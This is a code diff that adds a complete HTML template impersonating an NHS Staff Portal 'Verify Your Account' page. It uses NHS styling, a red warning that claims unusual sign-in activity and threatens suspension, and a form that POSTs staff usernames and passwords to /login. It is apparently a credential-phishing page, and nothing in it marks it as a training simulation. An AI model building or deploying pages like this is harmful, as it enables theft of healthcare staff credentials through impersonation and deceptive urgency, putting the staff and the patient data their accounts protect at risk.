@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NHS Staff Portal — Verify Your Account</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: "Frutiger", "Arial", sans-serif;
+      background: #f0f4f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── NHS top bar ── */
+    .nhs-bar {
+      background: #003087;
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+    .nhs-logo {
+      background: #fff;
+      color: #003087;
+      font-size: 22px;
+      font-weight: 900;
+      padding: 4px 10px;
+      letter-spacing: -1px;
+      border-radius: 2px;
+    }
+    .nhs-bar-title {
+      color: #fff;
+      font-size: 18px;
+      font-weight: 600;
+    }
+
+    /* ── warning banner ── */
+    .warning-banner {
+      background: #d5281b;
+      color: #fff;
+      text-align: center;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 600;
+      letter-spacing: 0.02em;
+    }
+    .warning-banner span {
+      margin-right: 8px;
+    }
+
+    /* ── main content ── */
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 48px 16px;
+    }
+
+    .card {
+      background: #fff;
+      border-top: 4px solid #003087;
+      border-radius: 4px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.12);
+      padding: 40px 44px;
+      width: 100%;
+      max-width: 480px;
+    }
+
+    .card h1 {
+      color: #212b32;
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+    .card .subtitle {
+      color: #4c6272;
+      font-size: 14px;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: #212b32;
+      margin-bottom: 6px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px 12px;
+      border: 2px solid #aeb7bd;
+      border-radius: 3px;
+      font-size: 16px;
+      color: #212b32;
+      margin-bottom: 20px;
+      transition: border-color 0.15s;
+    }
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      outline: none;
+      border-color: #003087;
+    }
+
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 13px;
+      background: #007f3b;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: background 0.15s;
+    }
+    .btn:hover { background: #00662f; }
+
+    .help-text {
+      font-size: 12px;
+      color: #4c6272;
+      margin-top: 20px;
+      text-align: center;
+    }
+    .help-text a { color: #003087; }
+
+    /* ── footer ── */
+    footer {
+      background: #003087;
+      color: #aec6cf;
+      font-size: 12px;
+      text-align: center;
+      padding: 16px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="nhs-bar">
+    <div class="nhs-logo">NHS</div>
+    <div class="nhs-bar-title">Staff Portal</div>
+  </div>
+
+  <div class="warning-banner">
+    <span>⚠</span>Unusual sign-in activity detected on your account — verify your identity to avoid suspension
+  </div>
+
+  <main>
+    <div class="card">
+      <h1>Verify Your Account</h1>
+      <p class="subtitle">
+        Our security systems have flagged your account. Please re-enter your
+        credentials to confirm your identity. This is a mandatory IT policy requirement.
+      </p>
+
+      {% if error %}
+      <div style="background:#fde8e6;border-left:4px solid #d5281b;padding:10px 14px;margin-bottom:20px;font-size:14px;color:#d5281b;">
+        {{ error }}
+      </div>
+      {% endif %}
+
+      <form method="POST" action="/login">
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username"
+               placeholder="e.g. jsmith" autocomplete="off" autofocus />
+
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password"
+               placeholder="Enter your password" />
+
+        <button type="submit" class="btn">Verify and Continue</button>
+      </form>
+
+      <p class="help-text">
+        Problems logging in? Contact <a href="#">IT Support</a> on ext. 4400
+      </p>
+    </div>
+  </main>
+
+  <footer>
+    &copy; 2026 NHS Digital &nbsp;|&nbsp; Staff Portal v4.2 &nbsp;|&nbsp;
+    All access is monitored and logged.
+  </footer>
+
+</body>
+</html>
